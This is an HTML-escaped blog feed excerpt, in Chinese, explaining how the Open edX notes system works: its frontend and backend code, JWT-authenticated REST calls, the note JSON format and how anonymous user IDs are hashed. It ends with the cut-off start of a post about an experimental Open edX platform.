&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/openannotation/annotator"&gt;openannotation/annotator&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.annotatorjs.org/en/v1.2.x/"&gt;文档&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;edx中的依赖&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/static/js/edxnotes/views/shim.js"&gt;shim.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/static/lms/js/require-config.js#L36"&gt;require-config.js&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;edx中业务逻辑&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/tree/named-release/dogwood.rc/lms/static/js/edxnotes"&gt;lms/static/js/edxnotes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;后端&lt;/h1&gt;
&lt;h4&gt;已废弃&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/tree/master/lms/djangoapps/notes"&gt;lms/djangoapps/notes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;edx-notes-api&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-notes-api"&gt;edx-notes-api&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-notes-api/blob/master/notesapi/v1/search_indexes.py"&gt;search&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-notes-api/blob/caf5719aa1fbcf344927c7530a2fd627d9d7782f/notesserver/settings/common.py"&gt;search setting&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-notes-api/blob/master/Makefile#L42"&gt;create-index&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-notes-api/blob/master/notesapi/v1/views.py"&gt;api 文档（RESTful）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;lms&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/tree/master/lms/djangoapps/edxnotes"&gt;lms/djangoapps/edxnotes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;其他&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/master/common/lib/xmodule/xmodule/annotator_token.py"&gt;annotator_token&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;RESTful接口&lt;/h1&gt;
&lt;p&gt;通信相关&lt;/p&gt;
&lt;h2&gt;在LMS中记条笔记的来龙去脉&lt;/h2&gt;
&lt;p&gt;在lms里做笔记，观察ajax请求，可以看到笔记以POST方式发往：http://NOTESERVER/api/v1/annotations/&lt;/p&gt;
&lt;p&gt;header中带有&lt;code&gt;x-annotator-auth-token&lt;/code&gt;和&lt;code&gt;X-CSRFToken&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;x-annotator-auth-token&lt;/code&gt;实际上是一个JWT编码的串，放到&lt;a href="https://jwt.io/"&gt;jwt.io&lt;/a&gt;解码完，可看到结果形如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;sub&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;35774bce800db0e8a76980d9c332df73&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;administrator&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ww&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;exp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1464079917&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;iss&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://LMS/oauth2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;iat&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1464079887&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;preferred_username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ww&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;email&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ww@qq.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;aud&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edx-notes-id&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;代码见&lt;a href="https://github.com/edx/edx-platform/blob/master/lms/djangoapps/edxnotes/views.py#L174"&gt;get_token&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上边链接所在的模块就是lms与NOTESERVER通信的模块，通信的url入口为&lt;a href="https://github.com/edx/edx-platform/blob/master/lms/djangoapps/edxnotes/helpers.py#L381"&gt;get_internal_endpoint&lt;/a&gt;&lt;/p&gt;
&lt;h5&gt;新技能&lt;/h5&gt;
&lt;p&gt;这里边有个值得注意的地方是：&lt;a href="https://github.com/edx/edx-platform/blob/master/lms/djangoapps/edxnotes/helpers.py#L26"&gt;get_id_token&lt;/a&gt;,这个工具是通用的，如果想用jwt来发送受信信息的话&lt;/p&gt;
&lt;p&gt;通过JWT，我们可以保证数据是被签名过可信任的。&lt;/p&gt;
&lt;p&gt;值得注意的还有当前这部分并不完善，许多地方还是硬编码的,诸如：&lt;a href="https://github.com/edx/edx-platform/blob/master/lms/djangoapps/edxnotes/helpers.py#L35"&gt;CLIENT_NAME&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;观察网络面板，可以看到，发送的数据形如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;ranges&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/div[1]/p[2]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;startOffset&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;end&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/div[1]/p[2]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;endOffset&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;}],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;quote&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;你可以观看介绍视频&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;课程介绍&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;fun&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;35774bce800db0e8a76980d9c332df73&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;usage_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;block-v1:edX+test+2014_T2+type@html+block@af9f16e4a4704f4ab52bc90e5280ba18&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;course_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;course-v1:edX+test+2014_T2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;相关的前端模型定义在&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/static/js/edxnotes/models/note.js"&gt;edxnotes/models/note.js&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前端note工厂为&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/static/js/edxnotes/views/notes_factory.js"&gt;edxnotes/views/notes_factory.js&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;user是不是采用了什么编码/加密（和edx的匿名用户id一样吗？）&lt;/p&gt;
&lt;p&gt;对此有兴趣的同学可以参考&lt;a href="https://github.com/edx/edx-platform/blob/master/common/templates/edxnotes_wrapper.html"&gt;common/templates/edxnotes_wrapper.html&lt;/a&gt;,其中关键部分为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;student.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;anonymous_id_for_user&lt;/span&gt;
&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;anonymous_id_for_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;猜测和edx成绩单中匿名用户的机制一样&lt;/p&gt;
&lt;p&gt;出于好奇，追踪到底:&lt;a href="https://github.com/edx/edx-platform/blob/master/common/djangoapps/student/models.py#L107"&gt;anonymous_id_for_user&lt;/a&gt;,至此我们揭开了匿名ip的全部谜团&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Return a unique id for a (user, course) pair&lt;/li&gt;
&lt;li&gt;If user is an &lt;code&gt;AnonymousUser&lt;/code&gt;, returns &lt;code&gt;None&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;核心源码为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;hasher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;hasher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SECRET_KEY&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;hasher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;course_id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;hasher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;course_id&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_deprecated_string&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;digest&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hasher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;由此可知，登录用户的anonymous_id是唯一的，使其具有唯一性的影响因素包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;settings.SECRET_KEY（站点级别）&lt;/li&gt;
&lt;li&gt;course_id &lt;/li&gt;
&lt;li&gt;user.id&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;心满意足收场&lt;/p&gt;
&lt;h2&gt;搜索笔记&lt;/h2&gt;
&lt;p&gt;我们在lms的笔记汇总页面&lt;code&gt;http://LMS/courses/course-v1:edX+DemoX+Demo_Course/edxnotes/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;搜索笔记时，发出的http（ajax）请求为&lt;code&gt;http://LMS/courses/course-v1:edX+DemoX+Demo_Course/edxnotes/search/?text=hello&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;实际上，这个请求实际上是代理了edx-notes-api。&lt;/p&gt;
&lt;h3&gt;edx-notes-api&lt;/h3&gt;
&lt;p&gt;我们使用httpie来向edx-notes-api请求笔记数据&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://NOTESERVER/api/v1/search/?user=106ecd878f4148a5cabb6bbb0979b730&amp;amp;usage_id=block-v1%3AedX%2BDemoX%2BDemo_Course%2Btype%40html%2Bblock%4082d599b014b246c7a9b5dfc750dc08a9&amp;amp;course_id=course-v1%3AedX%2BDemoX%2BDemo_Course&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;url解码完为&lt;code&gt;http://NOTESERVER/api/v1/search/?user=106ecd878f4148a5cabb6bbb0979b730&amp;amp;usage_id=block-v1:edX+DemoX+Demo_Course+type@html+block@82d599b014b246c7a9b5dfc750dc08a9&amp;amp;course_id=course-v1:edX+DemoX+Demo_Course&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们使用httpie测试&lt;/p&gt;
&lt;p&gt;http "http://NOTESERVER/api/v1/search/?user=106ecd878f4148a5cabb6bbb0979b730&amp;amp;usage_id=block-v1%3AedX%2BDemoX%2BDemo_Course%2Btype%40html%2Bblock%4082d599b014b246c7a9b5dfc750dc08a9&amp;amp;course_id=course-v1%3AedX%2BDemoX%2BDemo_Course" (注意要url编码！)&lt;/p&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;rows&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;course_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;created&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2016-05-12T03:38:24.565900+00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;quote&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;nks above. At edX&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;ranges&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
                &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;end&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/div[1]/p[2]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;endOffset&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;206&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/div[1]/p[2]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;startOffset&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;188&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="p"&gt;],&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
                &lt;span class="s2"&gt;&amp;quot;tag&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;],&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;df&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;updated&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2016-05-12T03:38:24.566048+00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;usage_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@82d599b014b246c7a9b5dfc750dc08a9&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;106ecd878f4148a5cabb6bbb0979b730&amp;quot;&lt;/span&gt;
        &lt;span class="p"&gt;},&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;course_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;created&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2016-05-12T03:09:01.496272+00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;quote&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;to&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;ranges&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
                &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;end&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/div[1]/p[1]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;endOffset&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/div[1]/p[1]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;startOffset&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="p"&gt;],&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[],&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;updated&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2016-05-12T03:09:01.496376+00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;usage_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@82d599b014b246c7a9b5dfc750dc08a9&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;106ecd878f4148a5cabb6bbb0979b730&amp;quot;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;total&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;注意其中的&lt;code&gt;ranges&lt;/code&gt;属性,这是定位的关键，end和start是xpath，&lt;code&gt;tags&lt;/code&gt;属性用于存放标签，&lt;code&gt;usage_id&lt;/code&gt;是课程内容的定位符，user是用户匿名化后的结果&lt;/p&gt;
&lt;h1&gt;架构设计&lt;/h1&gt;
&lt;p&gt;edx的架构总体而言是采用RESTful api来解耦，笔记模块也不例外&lt;/p&gt;
&lt;p&gt;edx的笔记前端模块采用的是openannotation开放出来的annotator，openannotation同时也开放了后端，edX没有采用他们的后端，而是使用django-rest-framework重写了笔记部分的后端，我想应该是出于一致性的考虑，这样一来，整个团队的技术栈是统一的，个人而言我觉得这是个明智的决定，尽管这可能浪费一些时间（这确实浪费了不少时间，要知道笔记系统在birch版本中就准备投入使用的！）。&lt;/p&gt;
&lt;p&gt;我之所以会赞同这种做法，可能是因为对论坛模块的恐惧吧，论坛采用ruby写的，想对此做定制优化，就显得艰难（事实证明论坛也的确不够稳定）&lt;/p&gt;
&lt;p&gt;保持技术栈的一致，有利于让团队成员更热衷维护它们&lt;/p&gt;
&lt;p&gt;如果你有兴趣进一步看笔记的模型，请阅读&lt;a href="https://github.com/edx/edx-notes-api/blob/master/notesapi/v1/models.py"&gt;notesapi/v1/models.py&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;总结&lt;/h1&gt;
&lt;p&gt;edx的笔记系统可以单独部署，只要做好oauth2的配置即可&lt;/p&gt;
&lt;p&gt;由于笔记系统是基于oauth2的，所以可以为手机端所用，同时如果我们将笔记系统视为一个服务，我们可以将它用在edx之外的网站或app里&lt;/p&gt;
&lt;h1&gt;后话&lt;/h1&gt;
&lt;p&gt;我对阅读和笔记偏好有加，想基于以下东西做个工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;annotator&lt;/li&gt;
&lt;li&gt;firebase&lt;/li&gt;
&lt;li&gt;chrome插件 &lt;ul&gt;
&lt;li&gt;参考划词翻译或者pocket&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个随手摘工具，同时能高亮做过笔记的网页&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 24 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-24:open-edx-note-system.html</guid><category>edx</category></item><item><title>一个Open-edX的实验平台</title><link>/Open-edx-test-platform.html</link><description>&lt;h1&gt;先秀一下颜值&lt;/h1&gt;
&lt;h3&gt;Tomorrow Night Eighties&lt;/h3&gt;
&lt;p&gt;由于采用了Sass来管理主题样式，替换起来十分简易，通过siteapi来向平台发送主题切换指令，可允许网站管理员动态切换主题，当然更好的方案是站内控制，不过目前这种方式已经极其便利了&lt;/p&gt;
&lt;p&gt;首先展示的配色风格是时下极其流行的代码配色主题:Tomorrow&lt;/p&gt;
&lt;p&gt;我的ipython notebook用的是这个配色&lt;/p&gt;
&lt;p&gt;Tomorrow Night Eighties的配色风格，温和而内敛&lt;/p&gt;
&lt;p&gt;&lt;img alt="olarized_light" src="http://7kttuq.com1.z0.glb.clouddn.com/solarized_light.jpg" /&gt;&lt;/p&gt;
&lt;h3&gt;更多配色&lt;/h3&gt;
&lt;p&gt;以下是其他的几种配色，正在实验中，包括深受vim和sublime用户欢迎的solarized风格（我用了light色调）&lt;/p&gt;
&lt;p&gt;以及程序员习惯的纯黑主题&lt;/p&gt;
&lt;p&gt;&lt;img alt="multi" src="http://7kttuq.com1.z0.glb.clouddn.com/multi.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;动机&lt;/h1&gt;
&lt;p&gt;搭建一个实验性质的Open edX平台&lt;/p&gt;
&lt;h1&gt;计划&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;分享架构经验和教训&lt;/li&gt;
&lt;li&gt;开放大部分数据&lt;/li&gt;
&lt;li&gt;将所有接口对外开放&lt;ul&gt;
